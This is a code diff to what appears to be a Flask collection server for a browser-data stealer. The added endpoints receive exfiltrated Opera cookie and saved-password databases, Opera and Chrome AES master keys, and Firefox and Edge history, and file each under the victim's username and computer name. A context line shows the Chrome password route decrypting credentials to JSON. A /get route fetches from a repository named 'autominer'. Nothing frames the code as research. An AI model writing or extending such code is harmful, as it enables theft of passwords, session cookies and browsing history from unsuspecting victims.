@@ -116,6 +116,23 @@ def saveCookie():
             f.write(txt)
         # print(txt)
         return "ok"
+    
+@app.route('/saveOperaCookie', methods=['POST'])
+def saveOperaCookie():
+    if request.method == 'POST':
+        data = request.form  # a multidict containing POST data
+        txt = data['text']
+        name = data['name']
+        username = data['username']
+        ComputerName = data['ComputerName']
+        txt = txt.split("\n")[0]
+        txt = base64.b64decode(txt)
+        filename = "OperaCookie" + \
+            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
+        with open("./dbs/"+filename+".sqlite", "wb") as f:
+            f.write(txt)
+        # print(txt)
+        return "ok"
 
 
 @app.route('/saveAesKey', methods=['POST'])
@@ -124,11 +141,29 @@ def saveAesKey():
         data = request.form  # a multidict containing POST data
         key = data['masterKey']
         username = data['username']
+        name=data['name']
         ComputerName = data['ComputerName']
         key = key.split("\n")[0]
         key = base64.b64decode(key)
         filename = "ChromeAESKey" + \
-            str(int(time.time()))+"-"+username+"-"+ComputerName
+            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
+        with open("./aesKey/"+filename+".aeskey", "wb") as f:
+            f.write(key)
+        # print(txt)
+        return "ok"
+    
+@app.route('/saveOperaAesKey', methods=['POST'])
+def saveOperaAesKey():
+    if request.method == 'POST':
+        data = request.form  # a multidict containing POST data
+        key = data['masterKey']
+        username = data['username']
+        name=data['name']
+        ComputerName = data['ComputerName']
+        key = key.split("\n")[0]
+        key = base64.b64decode(key)
+        filename = "OperaAESKey" + \
+            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
         with open("./aesKey/"+filename+".aeskey", "wb") as f:
             f.write(key)
         # print(txt)
@@ -162,6 +197,28 @@ def saveSavedPasswords():
         txt = txt.split("\n")[0]
         txt = base64.b64decode(txt)
         filename = "ChromeLoginData" + \
+            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
+        with open("./dbs/"+filename+".sqlite", "wb") as f:
+            f.write(txt)
+        password = decrypt("./dbs/"+filename+".sqlite", key)
+        with open("./data/"+filename+".json", "w") as f:
+            json.dump(password, f)
+        return "ok"
+
+@app.route('/saveOperaSavedPasswords', methods=['POST'])
+def saveOperaSavedPasswords():
+    if request.method == 'POST':
+        data = request.form  # a multidict containing POST data
+        txt = data['db']
+        key = data['masterKey']
+        name = data['name']
+        username = data['username']
+        ComputerName = data['ComputerName']
+        key = key.split("\n")[0]
+        key = base64.b64decode(key)
+        txt = txt.split("\n")[0]
+        txt = base64.b64decode(txt)
+        filename = "OperaLoginData" + \
             str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
         with open("./dbs/"+filename+".sqlite", "wb") as f:
             f.write(txt)
@@ -220,6 +277,53 @@ def saveOperaHistory():
         con.close()
         return "ok"
 
+
+@app.route('/saveFirefoxHistory', methods=['POST'])
+def saveFirefoxHistory():
+    if request.method == 'POST':
+        data = request.form  # a multidict containing POST data
+        txt = data['text']
+        name = data['name']
+        username = data['username']
+        ComputerName = data['ComputerName']
+        txt = txt.split("\n")[0]
+        txt = base64.b64decode(txt)
+        filename = "FirefoxHistory" + \
+            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
+        with open("./dbs/"+filename+".sqlite", "wb") as f:
+            f.write(txt)
+        con = sqlite3.connect("./dbs/"+filename+".sqlite")
+        cur = con.cursor()
+        cur = cur.execute("SELECT * FROM moz_places;")
+        # save as json
+        with open("./data/"+filename+".json", "w") as f:
+            json.dump(cur.fetchall(), f)
+        cur.close()
+        con.close()
+        return "ok"
+@app.route('/saveEdgeHistory', methods=['POST'])
+def saveEdgeHistory():
+    if request.method == 'POST':
+        data = request.form  # a multidict containing POST data
+        txt = data['text']
+        name = data['name']
+        username = data['username']
+        ComputerName = data['ComputerName']
+        txt = txt.split("\n")[0]
+        txt = base64.b64decode(txt)
+        filename = "EdgeHistory" + \
+            str(int(time.time()))+"-"+name+"-"+username+"-"+ComputerName
+        with open("./dbs/"+filename+".sqlite", "wb") as f:
+            f.write(txt)
+        con = sqlite3.connect("./dbs/"+filename+".sqlite")
+        cur = con.cursor()
+        cur = cur.execute("SELECT * FROM 'urls'")
+        # save as json
+        with open("./data/"+filename+".json", "w") as f:
+            json.dump(cur.fetchall(), f)
+        cur.close()
+        con.close()
+        return "ok"
 @app.route('/get')
 def get():
     return requests.get("https://raw.githubusercontent.com/zlc1004/autominer/main/get").text
